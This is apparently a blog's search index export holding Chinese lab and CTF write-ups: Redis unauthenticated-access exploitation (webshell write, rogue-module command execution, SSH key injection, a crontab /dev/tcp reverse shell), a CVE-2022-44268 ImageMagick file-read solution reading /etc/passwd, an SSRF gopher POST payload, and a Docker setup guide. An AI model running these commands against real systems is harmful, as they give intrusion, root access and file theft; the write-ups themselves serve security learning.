<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>redis 4-unacc 未授权访问漏洞</title>
      <link href="/2023/05/18/redis-4-unacc-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/05/18/redis-4-unacc-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="漏洞解析"><a href="#漏洞解析" class="headerlink" title="漏洞解析"></a>漏洞解析</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Redis 2.x，3.x，4.x，5.x </span><br></pre></td></tr></table></figure><p>Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。　　部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。目前比较主流的案例：yam2 minerd 挖矿程序，还有在多次应急事件中发现大量的watch-smartd挖矿木马。</p><p>版本较高的redis 还需要将 protected-mode设为no<br>redis3.2版本后新增protected-mode配置，默认是yes，即开启。设置外部网络连接redis服务，设置方式如下：<br>1、关闭protected-mode模式，此时外部网络可以直接访问<br>2、开启protected-mode保护模式，需配置bind ip或者设置访问密码</p><h2 id="vulhub漏洞复现"><a href="#vulhub漏洞复现" class="headerlink" title="vulhub漏洞复现"></a>vulhub漏洞复现</h2><h3 id="启动docker"><a href="#启动docker" class="headerlink" title="启动docker"></a>启动docker</h3><p>1.首先启动docker环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>2.查看是否已启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose ps</span><br></pre></td></tr></table></figure><p>3.关闭环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure><h3 id="安装redis-cli远程连接工具"><a href="#安装redis-cli远程连接工具" class="headerlink" title="安装redis-cli远程连接工具"></a>安装redis-cli远程连接工具</h3><p>下载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz </span><br><span class="line">tar -zxvf redis-stable.tar.gz</span><br><span class="line">cd redis-stable</span><br><span class="line">make</span><br><span class="line">cp src/redis-cli /usr/bin/    #将 Redis 命令行接口程序 redis-cli 从源代码复制到系统的可执行文件目录 /usr/bin/ 的命令，这样，在系统的任何位置都可以从终端调用 redis-cli</span><br><span class="line"></span><br><span class="line">redis-cli -h </span><br></pre></td></tr></table></figure><p>连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 靶机ip</span><br></pre></td></tr></table></figure><p><img src="https://jekyllxhexo.oss-cn-hangzhou.aliyuncs.com/202305181756017.png" alt="image-20230518175602920"></p><h3 id="写入shell文件"><a href="#写入shell文件" class="headerlink" title="写入shell文件"></a>写入shell文件</h3><p>靶场没有开启web端口无法直接上传木马文件，因此通过写入shell文件的方式添加后门</p><p>例如我们先通过dir设置一个目录A，而dbfilename为文件名B，再执行save或bgsave，则我们就可以写入一个路径为&#x2F;A&#x2F;B的任意文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /tmp    #设置路径</span><br><span class="line">config set dbfilename test.php    #设置文件名</span><br><span class="line">set webshell &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;    #写入webshell</span><br><span class="line">save    #保存</span><br></pre></td></tr></table></figure><p>然后进入靶机查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps   #查看容器id</span><br><span class="line">docker exec -it CONTAINER ID /bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://jekyllxhexo.oss-cn-hangzhou.aliyuncs.com/202305181837666.png" alt="image-20230518183719630"></p><p>写入shell文件成功</p><h3 id="使用py脚本执行远程命令"><a href="#使用py脚本执行远程命令" class="headerlink" title="使用py脚本执行远程命令"></a>使用py脚本执行远程命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/redis-rogue-getshell.git </span><br><span class="line">cd redis-rogue-getshell/RedisModulesSDK/exp</span><br><span class="line">make </span><br></pre></td></tr></table></figure><p><img src="https://jekyllxhexo.oss-cn-hangzhou.aliyuncs.com/202305181839871.png" alt="image-20230518183928833"></p><p>然后回到redis-rogue-getshell目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./redis-master.py -r 10.130.192.0 -p 6379 -L 10.130.192.0 -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">./redis-master.py -r 10.130.192.0 -p 6379 -L 10.130.192.0 -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;ls&quot;</span><br><span class="line"></span><br><span class="line">#通过连接到Redis数据库服务器（IP地址为10.130.192.0:6379）并将一个动态链接库文件（exp.so）加载到Redis中，并执行命令</span><br></pre></td></tr></table></figure><p><img src="https://jekyllxhexo.oss-cn-hangzhou.aliyuncs.com/202305181841752.png" alt="image-20230518184148710"></p><p><img src="https://jekyllxhexo.oss-cn-hangzhou.aliyuncs.com/202305181843028.png" alt="image-20230518184352986"></p><h3 id="ssh公私钥免密登录"><a href="#ssh公私钥免密登录" class="headerlink" title="ssh公私钥免密登录"></a>ssh公私钥免密登录</h3><p>原理:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">登陆linux有几种方式，最常用的是密码登陆和RSA key 登陆，RSA key登陆是生成一个公私对应的秘钥，然后将公钥放到linux系统的/root/.ssh/authorized_keys的文件中，我们本地客户端通过导入对应私钥进行登陆，这就是RSA key的登陆方式。</span><br><span class="line">但是为什么redis可以获取服务器的root权限呢？</span><br><span class="line">上面RSA key的登陆方式在服务器方面是要将公钥写入authorized_keys文件中的，而redis有一种持久化方式是生成RDB文件，通过持久化将公钥写入root下的authored_keys文件里，这样就将非法的公钥写到了验证文件里，后面我们拿对应私钥登陆即可。（但是这种方式需要再redis是root启动的情况下使用，因为非root权限无法进入/root目录）</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">输入之后一路回车即可</span><br></pre></td></tr></table></figure><p><img src="https://jekyllxhexo.oss-cn-hangzhou.aliyuncs.com/202305181846268.png" alt="image-20230518184631232"></p><p>进入&#x2F;root&#x2F;.ssh目录: 将生成的公钥保存到1.txt（前后用\n换行，避免和Redis里其他缓存数据混合）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; 1.txt  </span><br></pre></td></tr></table></figure><p>使用redis-cli -h ip命令连接靶机，把1.txt写入redis中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 1.txt | redis-cli -h 10.130.192.0 -x set crack</span><br></pre></td></tr></table></figure><p><img src="https://jekyllxhexo.oss-cn-hangzhou.aliyuncs.com/202305181849962.png" alt="image-20230518184931828"></p><p>设置上传公钥的备份文件名字为authorized_keys：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET dbfilename authorized_keys  </span><br></pre></td></tr></table></figure><p><img src="https://jekyllxhexo.oss-cn-hangzhou.aliyuncs.com/202305181851737.png" alt="image-20230518185122710"></p><p>此时在攻击机上使用SSH免密登录靶机，利用私钥成功登入redis服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@10.130.192.0</span><br></pre></td></tr></table></figure><h3 id="crontab-计划任务getshell"><a href="#crontab-计划任务getshell" class="headerlink" title="crontab-计划任务getshell"></a>crontab-计划任务getshell</h3><p>首先得在攻击机上监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 5555</span><br></pre></td></tr></table></figure><p>写入计划任务（连接时需要以root用户身份）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.130.192.0</span><br><span class="line">set test &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/10.130.192.0/5555 0&gt;&amp;1\n&quot; #意思是向10.130.192.0的5555端口反弹shell</span><br><span class="line">config set dir /var/spool/cron  #设置工作目录</span><br><span class="line">config set dbfilename root #设置文件名，当前用户叫啥就得命名为啥</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>上面这几行命令的意思就是将命令写入test文件中，并且存放在&#x2F;var&#x2F;spool&#x2F;cron目录下</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.用redis-cli命令远程登录redis主机</span><br><span class="line">2.写入shell文件</span><br><span class="line">3.利用&quot;公私钥&quot;认证获取root权限</span><br><span class="line">4.使用py脚本执行远程命令</span><br><span class="line">5.crontab-计划任务getshell</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023数字网络安全人才挑战赛初赛-misc部分</title>
      <link href="/2023/03/29/2023%E6%95%B0%E5%AD%97%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-misc%E9%83%A8%E5%88%86%EF%BC%88CVE-2022-44268)/"/>
      <url>/2023/03/29/2023%E6%95%B0%E5%AD%97%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-misc%E9%83%A8%E5%88%86%EF%BC%88CVE-2022-44268)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="2023数字网络安全人才挑战赛初赛-misc部分（CVE-2022-44268"><a href="#2023数字网络安全人才挑战赛初赛-misc部分（CVE-2022-44268" class="headerlink" title="2023数字网络安全人才挑战赛初赛-misc部分（CVE-2022-44268)"></a>2023数字网络安全人才挑战赛初赛-misc部分（CVE-2022-44268)</h1><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>参考链接如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub/blob/master/imagemagick/CVE-2022-44268/README.zh-cn.md</span><br></pre></td></tr></table></figure><p>首先在这个网站下，下载poc.py到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub/tree/master/imagemagick/CVE-2022-44268</span><br></pre></td></tr></table></figure><p>之后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 poc.py generate -o poc.png -r /root/flag  #生成poc.png,要读取的文件路径为/root/flag</span><br></pre></td></tr></table></figure><img src="https://jekyllxhexo.oss-cn-hangzhou.aliyuncs.com/202303290930397.png" style="zoom:60%"><p>之后把这张图片在网站上上传，找到上传后生成的图片，保存至本地，然后 cat out.png</p><p><img src="https://jekyllxhexo.oss-cn-hangzhou.aliyuncs.com/202303290939813.png" alt="image-20230329093900687"></p><p><img src="https://jekyllxhexo.oss-cn-hangzhou.aliyuncs.com/202303290943464.png" alt="image-20230329094342387"></p><h2 id="CVE-2022-44268详解"><a href="#CVE-2022-44268详解" class="headerlink" title="CVE-2022-44268详解"></a>CVE-2022-44268详解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。</span><br><span class="line">在ImageMagick 7.1.0-51版本及以前，其处理PNG文件的代码中存在一处功能，会导致转换图片时读取到当前操作系统上的任意文件，并将文件内容输出在图片内容中。</span><br></pre></td></tr></table></figure><p>后端代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$newname = uniqid() . &#x27;.png&#x27;;</span><br><span class="line">shell_exec(&quot;convert -resize 50x50 &#123;$_FILES[&#x27;file_upload&#x27;][&#x27;tmp_name&#x27;]&#125; ./&#123;$newname&#125;&quot;);</span><br></pre></td></tr></table></figure><p>代码解释如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.uniqid() 函数会生成一个唯一的字符串作为新文件的文件名，该字符串通常基于当前时间戳或随机数生成。</span><br><span class="line">2.使用字符串拼接操作符 . 将生成的字符串与后缀名 &#x27;.png&#x27; 结合起来，生成新文件的完整文件名 $newname。</span><br><span class="line">3.使用 shell_exec() 函数，通过执行命令行工具 &quot;convert&quot; ，将用户上传的文件（即 $_FILES[&#x27;file_upload&#x27;][&#x27;tmp_name&#x27;]）进行大小调整并将其保存为 PNG 格式的新文件（即 ./&#123;$newname&#125;）。</span><br><span class="line">也就是说该段代码将用户上传的文件直接传递给 shell 命令</span><br></pre></td></tr></table></figure><p>poc.py解释如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1.导入必要的 Python 库，包括 sys、png、zlib、argparse、binascii、logging 等。</span><br><span class="line"></span><br><span class="line">2.初始化 zlib 压缩和解压对象，准备一些 PNG 图像文件的必要信息，包括 IHDR、IDAT 等。</span><br><span class="line"></span><br><span class="line">3.定义一个名为 parse_data 的函数，用于从 PNG 文件的 zTXt chunk 中提取出文本信息。</span><br><span class="line"></span><br><span class="line">4.定义一个名为 read 的函数，用于读取 PNG 文件，遍历其中的 chunk，并检查是否存在 zTXt chunk。如果存在，则调用 parse_data 函数解析其中的文本信息并输出到 stdout 中。</span><br><span class="line"></span><br><span class="line">5.定义一个名为 write 的函数，用于将数据写入 PNG 文件。它首先打开目标文件，并写入 PNG 文件的 signature。然后，如果给定了源文件名，则从该文件读取 chunk 并写入目标文件中，否则直接写入 IHDR 和 IDAT chunk。最后，它写入一个名为 &quot;tEXt&quot; 的新 chunk，其中包含目标文件的名称，以及一个名为 &quot;IEND&quot; 的 chunk 来标志 PNG 文件的结尾。</span><br><span class="line"></span><br><span class="line">6.定义一个名为 main 的函数，用于解析命令行参数，并根据指定的操作执行相应的函数。</span><br><span class="line">最后，通过 if __name__ == &#x27;__main__&#x27;: 的条件语句，确保该程序作为主程序运行时才执行 main() 函数。</span><br></pre></td></tr></table></figure><p>zTXt chunk解释：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PNG 文件中的 zTXt chunk 是一种文本块，用于存储压缩过的关键字-文本对。在这种块中，关键字和文本以 null 字节（\x00）分隔，而且文本是用 DEFLATE 算法压缩的。该块可以用来存储元数据、注释或其他信息。</span><br><span class="line"></span><br><span class="line">zTXt chunk 的结构如下：</span><br><span class="line"></span><br><span class="line">4字节：chunk 的长度（不包括类型码和 CRC 校验码）</span><br><span class="line">4字节：chunk 的类型码， 为&#x27;zTXt&#x27;</span><br><span class="line">数据区：包含一个关键字和用 DEFLATE 算法压缩的文本数据。关键字和文本数据之间使用 null 字节（\x00）分隔。</span><br><span class="line">在poc.py中，该块的值被解压缩，然后使用 parse_data() 函数将其解析为字符串，最终输出到 stdout。如果代码中的 -r 参数没有指定一个文件名，程序将使用默认的 /etc/passwd 文件名。</span><br></pre></td></tr></table></figure><p>漏洞复现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">生成图片：</span><br><span class="line">python3 poc.py generate -o xxx.png -r /etc/passwd</span><br><span class="line">或</span><br><span class="line">./poc.py generate -o xxx.png -r /etc/passwd</span><br><span class="line"></span><br><span class="line">提取其中内容：</span><br><span class="line">./poc.py parse -i out.png</span><br><span class="line">或</span><br><span class="line">python3 poc.py parse -i out.png</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> CVE-2022-44268 </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHUB技能树-SSRF-POST请求</title>
      <link href="/2023/03/28/CTFHUB-POST/"/>
      <url>/2023/03/28/CTFHUB-POST/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p> 这题和一个赛题几乎一模一样x</p><h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p> 利用302协议（重定向）的跳转ssrf。可以访问与服务器相连的内网</p><p>首先访问  &#x2F;?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php  访问index.php</p><p>然后得到index.php的源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_REQUEST[&#x27;url&#x27;]))&#123;</span><br><span class="line">    header(&quot;Location: /?url=_&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch = curl_init();   //初始化一次curl对话，ch返回curl句柄</span><br><span class="line">//curl_setopt为 cURL 会话句柄设置选项。 </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#x27;url&#x27;]);    //curlopt_url需要获取的 URL 地址</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);   //启用时会将头文件的信息作为数据流输出。</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);   // 位掩码， 1 (301 永久重定向), 2 (302 Found) 和 4 (303 See Other) 设置 CURLOPT_FOLLOWLOCATION 时，什么情况下需要再次 HTTP POST 到重定向网址。  </span><br><span class="line">curl_exec($ch);  //执行</span><br><span class="line">curl_close($ch);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后访问 &#x2F;?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><img src="https://jekyllxhexo.oss-cn-hangzhou.aliyuncs.com/202303280952513.png" style="zoom:50%" /><p>得到flag.php的源码，分析得要通过127.0.0.1来访问，之后访问</p><p>&#x2F;?url&#x3D;127.0.0.1&#x2F;flag.php，查看源码，可以得到一个key值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7a139e5abad0c45b4cffc2fbb1d11a7</span><br></pre></td></tr></table></figure><p>这样我们的思路就很明确了，flag.php查看源码，含有字符key，flag.php界面有个框框，而且该框框输入数据会提示只能内网访问。并且index.php可以接受url传参，那这样我们就可以利用gopher协议向index.php传入一个POST请求包，请求包里是flag.php的key。</p><p>向index.php传入payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=127.0.0.1:80/index.php?url=(gopher协议,post请求)</span><br></pre></td></tr></table></figure><p>请求内网80端口的POST包,因为我们传入的key长度为36，因此Content-Length:36</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line">key=7a139e5abad0c45b4cffc2fbb1d11a7</span><br></pre></td></tr></table></figure><p>然后进行三次编码，第一次编码之后%0A全部替换成%0D%0A,之后再进行两次编码</p><p>之后得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?url=index.php?url=gopher://127.0.0.1:80/_POST%252520/flag.php%252520HTTP/1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-</span><br><span class="line">Type%25253A%252520application/x-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D7a139e5abad0c45b4cffc2fbb1d11a7</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://jekyllxhexo.oss-cn-hangzhou.aliyuncs.com/202303280856088.png" alt="image-20230328085626984"></p><h2 id="gopher介绍"><a href="#gopher介绍" class="headerlink" title="gopher介绍"></a>gopher介绍</h2><h3 id="什么是gopher协议"><a href="#什么是gopher协议" class="headerlink" title="什么是gopher协议"></a>什么是gopher协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gopher是Internet上一个信息查找系统，它将Internet上的文件组织成某种</span><br><span class="line">索引，方便用户从Internet的一处带到另一处。在WWW出现之前，Gopher</span><br><span class="line">是Internet上最主要的信息检索工具。使用tcp70端口。但在WWW出现</span><br><span class="line">后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</span><br><span class="line">gopher协议支持发出GET、POST请求</span><br></pre></td></tr></table></figure><h3 id="gopher协议适用条件"><a href="#gopher协议适用条件" class="headerlink" title="gopher协议适用条件"></a>gopher协议适用条件</h3><p><img src="https://jekyllxhexo.oss-cn-hangzhou.aliyuncs.com/202303282057296.png" alt="image-20230328205723215"></p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接上TCP数据流</span><br><span class="line">gopher://127.0.0.1:80/内容(比如POST请求)</span><br></pre></td></tr></table></figure><p>内容可以是字符串，php代码，文件等等，ip一般不用换为127.0.0.1,端口号根据漏洞利用的环境更换，比如FASTCGI的9000端口， gopher的默认端口是70，题目常用的是80</p><p>要点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一次编码要把所有的%0A换成%0D0A(post请求,回车换行需要使用%0D%0A)，后再进行两次编码</span><br><span class="line">目标文件得有一些对应的利用功能，本题采用curl执行语句进行利用</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> CTF </category>
          
          <category> CTFHUB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
            <tag> CTFHUB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用docker复现web题</title>
      <link href="/2023/03/14/docker1/"/>
      <url>/2023/03/14/docker1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="一、首先下载docker和docker-docker-compose"><a href="#一、首先下载docker和docker-docker-compose" class="headerlink" title="一、首先下载docker和docker-docker-compose"></a>一、首先下载docker和docker-docker-compose</h3><p>我使用的服务器是ubuntu20</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br><span class="line">sudo apt install docker-compose</span><br></pre></td></tr></table></figure><h3 id="二、查看docker和docker-compose是否下载成功"><a href="#二、查看docker和docker-compose是否下载成功" class="headerlink" title="二、查看docker和docker-compose是否下载成功"></a>二、查看docker和docker-compose是否下载成功</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker -v</span><br><span class="line">docker-compose version</span><br></pre></td></tr></table></figure><h3 id="三、下载题目并启动docker"><a href="#三、下载题目并启动docker" class="headerlink" title="三、下载题目并启动docker"></a>三、下载题目并启动docker</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/CTFTraining/0ctf_2016_unserialize.git /root/CTF-WEBti/</span><br><span class="line">cd /root/CTF-WEBti/</span><br><span class="line">service docker start</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker ps                                                      #查看容器是否开启</span><br></pre></td></tr></table></figure><h3 id="四、端口映射到公网ip"><a href="#四、端口映射到公网ip" class="headerlink" title="四、端口映射到公网ip"></a>四、端口映射到公网ip</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 8300(服务器开启的端口):80(容器内部端口) &lt;image-name&gt;</span><br></pre></td></tr></table></figure><p>如果不确定容器内部端口，可使用如下命令查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker port &lt;container-id&gt;</span><br><span class="line">container-id 可以使用docker ps命令查看</span><br></pre></td></tr></table></figure><p>最后访问 公网ip：端口号  即可</p><img src="https://jekyllxhexo.oss-cn-hangzhou.aliyuncs.com/202303141651621.png" style="zoom:40%" /><h3 id="五、服务器开启端口"><a href="#五、服务器开启端口" class="headerlink" title="五、服务器开启端口"></a>五、服务器开启端口</h3><p><img src="https://jekyllxhexo.oss-cn-hangzhou.aliyuncs.com/202303141659844.png" 